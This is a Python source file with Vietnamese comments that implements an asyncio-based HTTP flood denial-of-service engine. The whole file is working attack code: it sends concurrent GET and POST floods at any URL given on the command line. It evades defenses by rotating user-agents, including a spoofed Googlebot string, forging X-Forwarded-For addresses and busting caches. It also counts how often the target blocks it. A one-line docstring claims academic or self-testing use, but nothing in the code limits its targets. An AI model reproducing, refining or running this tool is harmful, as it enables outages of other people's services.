#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP Flood DDoS Engine
Hỗ trợ: GET Flood, POST Flood với asyncio + aiohttp
Chỉ dùng cho mục đích học thuật / kiểm thử hệ thống của bạn.
"""

import asyncio
import aiohttp
import time
import random
import string
from dataclasses import dataclass, field
from typing import Optional
import logging

logger = logging.getLogger('ddos.http_flood')

# Danh sách User-Agent ngẫu nhiên để giả lập nhiều trình duyệt
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'curl/8.4.0',
    'python-requests/2.31.0',
]

PATHS = ['/', '/api/health', '/api/data', '/login', '/search', '/index.php',
         '/wp-admin', '/admin', '/api/v1/users', '/static/js/main.js']


@dataclass
class FloodStats:
    sent: int = 0
    success: int = 0
    errors: int = 0
    blocked: int = 0
    start_time: float = field(default_factory=time.time)
    running: bool = False

    def rps(self) -> float:
        elapsed = time.time() - self.start_time
        if elapsed == 0:
            return 0.0
        return round(self.sent / elapsed, 1)

    def to_dict(self) -> dict:
        return {
            'sent': self.sent,
            'success': self.success,
            'errors': self.errors,
            'blocked': self.blocked,
            'rps': self.rps(),
            'elapsed': round(time.time() - self.start_time, 1),
            'running': self.running,
        }


class HTTPFlood:
    """
    HTTP Flood Attack Engine
    Sử dụng asyncio để gửi đồng thời nhiều request.
    """

    def __init__(
        self,
        target_url: str,
        method: str = 'GET',
        num_workers: int = 50,
        duration: int = 10,
        rate_limit: Optional[int] = None,  # requests/second, None = unlimited
        stats_callback=None,
    ):
        self.target_url = target_url.rstrip('/')
        self.method = method.upper()
        self.num_workers = num_workers
        self.duration = duration
        self.rate_limit = rate_limit
        self.stats_callback = stats_callback

        self.stats = FloodStats()
        self._stop_event = asyncio.Event()

    def _random_headers(self) -> dict:
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}',
        }

    def _random_path(self) -> str:
        return random.choice(PATHS)

    def _random_payload(self, size: int = 512) -> dict:
        return {
            'data': ''.join(random.choices(string.ascii_letters + string.digits, k=size)),
            'timestamp': time.time(),
            'session': ''.join(random.choices(string.hexdigits, k=16)),
        }

    async def _worker(self, session: aiohttp.ClientSession, worker_id: int):
        """Một worker gửi request liên tục đến khi bị dừng."""
        delay = 1.0 / self.rate_limit if self.rate_limit else 0

        while not self._stop_event.is_set():
            try:
                url = self.target_url + self._random_path()
                headers = self._random_headers()

                if self.method == 'GET':
                    params = {'t': str(random.randint(1000, 9999))}
                    async with session.get(url, headers=headers, params=params, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        self.stats.sent += 1
                        if resp.status in (200, 201, 204):
                            self.stats.success += 1
                        elif resp.status in (403, 429, 503):
                            self.stats.blocked += 1
                        else:
                            self.stats.errors += 1

                elif self.method == 'POST':
                    payload = self._random_payload()
                    async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        self.stats.sent += 1
                        if resp.status in (200, 201, 204):
                            self.stats.success += 1
                        elif resp.status in (403, 429, 503):
                            self.stats.blocked += 1
                        else:
                            self.stats.errors += 1

                if delay > 0:
                    await asyncio.sleep(delay)

            except asyncio.CancelledError:
                break
            except Exception as e:
                self.stats.errors += 1
                await asyncio.sleep(0.01)

    async def _stats_reporter(self):
        """Báo cáo stats định kỳ mỗi 0.5 giây."""
        while not self._stop_event.is_set():
            if self.stats_callback:
                await self.stats_callback(self.stats.to_dict())
            await asyncio.sleep(0.5)

    async def run(self):
        """Chạy HTTP Flood attack."""
        self.stats = FloodStats()
        self.stats.running = True
        self._stop_event.clear()

        connector = aiohttp.TCPConnector(
            limit=self.num_workers + 200,  # headroom cho 2000+ workers
            limit_per_host=0,              # 0 = không giới hạn per-host
            ttl_dns_cache=300,
            ssl=False,
            force_close=False,
        )

        timeout = aiohttp.ClientTimeout(total=15, connect=5)

        logger.info(f"Bắt đầu HTTP {self.method} Flood: {self.target_url}")
        logger.info(f"Workers: {self.num_workers}, Duration: {self.duration}s")

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            workers = [
                asyncio.create_task(self._worker(session, i))
                for i in range(self.num_workers)
            ]
            reporter = asyncio.create_task(self._stats_reporter())

            # Chạy trong duration giây
            await asyncio.sleep(self.duration)
            self._stop_event.set()

            # Dọn dẹp
            for w in workers:
                w.cancel()
            reporter.cancel()

            await asyncio.gather(*workers, reporter, return_exceptions=True)

        self.stats.running = False
        if self.stats_callback:
            await self.stats_callback(self.stats.to_dict())

        return self.stats.to_dict()

    async def stop(self):
        """Dừng attack ngay lập tức."""
        self._stop_event.set()
        self.stats.running = False


async def run_http_flood(
    target_url: str,
    method: str = 'GET',
    workers: int = 50,
    duration: int = 10,
    rate_limit: Optional[int] = None,
    stats_callback=None,
) -> dict:
    """Helper function để chạy HTTP Flood."""
    engine = HTTPFlood(
        target_url=target_url,
        method=method,
        num_workers=workers,
        duration=duration,
        rate_limit=rate_limit,
        stats_callback=stats_callback,
    )
    return await engine.run()


if __name__ == '__main__':
    import sys
    logging.basicConfig(level=logging.INFO)

    target = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:8080'
    print(f"🔥 HTTP Flood → {target}")

    async def main():
        async def cb(stats):
            print(f"\r  Sent: {stats['sent']:,}  RPS: {stats['rps']}  "
                  f"OK: {stats['success']}  Blocked: {stats['blocked']}  "
                  f"Err: {stats['errors']}", end='', flush=True)

        result = await run_http_flood(target, workers=100, duration=15, stats_callback=cb)
        print(f"\n✅ Done: {result}")

    asyncio.run(main())
